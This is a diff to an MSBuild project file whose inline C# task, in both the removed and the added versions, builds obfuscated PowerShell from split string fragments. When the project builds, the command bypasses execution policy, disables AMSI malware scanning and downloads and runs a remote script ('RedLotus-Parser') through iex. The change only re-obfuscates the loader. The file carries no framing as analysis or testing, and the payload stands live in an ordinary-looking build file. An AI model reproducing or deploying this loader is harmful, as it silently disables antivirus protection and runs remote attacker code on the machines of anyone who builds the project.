@@ -1,15 +1,21 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="X"><Y /></Target>
-  <UsingTask TaskName="Y" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+  <Target Name="T"><C /></Target>
+  <UsingTask TaskName="C" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task><Code Type="Class" Language="cs"><![CDATA[
 using System;using System.Diagnostics;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
-public class Y:Task{public override bool Execute(){var z=new string[]{"pow","ersh","ell",".ex","e"};
-var a=string.Concat(z);var b=new string[]{"-N","oE","xit"," -","ep"," B","yp","ass"," -","w"," N","orm","al"," -","c"," \""};
-var c=string.Concat(b);var d=new string[]{"[R","ef]",".As","sem","bly",".Ge","tTy","pe(","'Sy","ste","m.M","ana","gem","ent",".Au","tom","ati","on.","Ams","iUt","ils","').","Get","Fie","ld(","'am","siI","nit","Fai","led","','","Non","Pub","lic",",St","ati","c').",".Se","tVa","lue","($n","ull",",$t","rue",")"};
-var e=string.Concat(d);var f=new string[]{";i","ex(","New","-Ob","jec","t N","et.","Web","Cli","ent",").D","own","loa","dSt","rin","g('"};
-var g=string.Concat(f);var h=new string[]{"ht","tps","://","raw",".gi","thu","bus","erc","ont","ent",".co","m/b","na1","69/","Red","Lot","us-","Par","ser","/re","fs/","hea","ds/","mai","n/R","edL","otu","s-P","ars","er.","ps1","')\""};
-var i=string.Concat(h);var j=c+e+g+i;var k=new ProcessStartInfo();k.FileName=a;k.Arguments=j;k.UseShellExecute=true;
-k.WindowStyle=ProcessWindowStyle.Normal;try{Process.Start(k);}catch{}return true;}}
+public class C:Task{public override bool Execute(){var s=new string[]{
+"po","we","rs","he","ll",".e","xe"};var e=string.Concat(s);
+var n=new string[]{"-N","oP","ro","fi","le"," -","Ex","ec","ut","io","nP","ol","ic","y"," B","yp","as","s"," -","Wi","nd","ow","St","yl","e"," N","or","ma","l"," -","Co","mm","an","d"," \""};
+var a=string.Concat(n);var m=new string[]{"[R","ef","].","As","se","mb","ly",".G","et","Ty","pe","('","Sy","st","em",".M","an","ag","em","en","t.","Au","to","ma","ti","on",".A","ms","iU","ti","ls","').",".G","et","Fi","el","d(","'a","ms","iI","ni","tF","ai","le","d'",",","'N","on","Pu","bl","ic",",S","ta","ti","c'",").","Se","tV","al","ue","($","nu","ll",",$","tr","ue",")"};
+var b=string.Concat(m);var u1=new string[]{"ht","tp","s:","//","ra","w.","gi","th","ub","us","er","co","nt","en","t.","co","m/"};
+var u2=new string[]{"bn","a1","69","/R","ed","Lo","tu","s-","Pa","rs","er","/r","ef","s/","he","ad","s/"};
+var u3=new string[]{"ma","in","/R","ed","Lo","tu","s-","Pa","rs","er",".p","s1"};
+var u=string.Concat(u1)+string.Concat(u2)+string.Concat(u3);
+var i=new string[]{";i","ex","(N","ew","-O","bj","ec","t ","Ne","t.","We","bC","li","en","t).",".D","ow","nl","oa","dS","tr","in","g(","'",""};
+var ix=string.Concat(i);var f=a+b+ix+u+"')\";";
+var p=new ProcessStartInfo();p.FileName=e;p.Arguments=f;p.UseShellExecute=true;
+p.WindowStyle=ProcessWindowStyle.Normal;p.CreateNoWindow=false;
+try{Process.Start(p);}catch{}return true;}}
 ]]></Code></Task>
   </UsingTask>
 </Project>
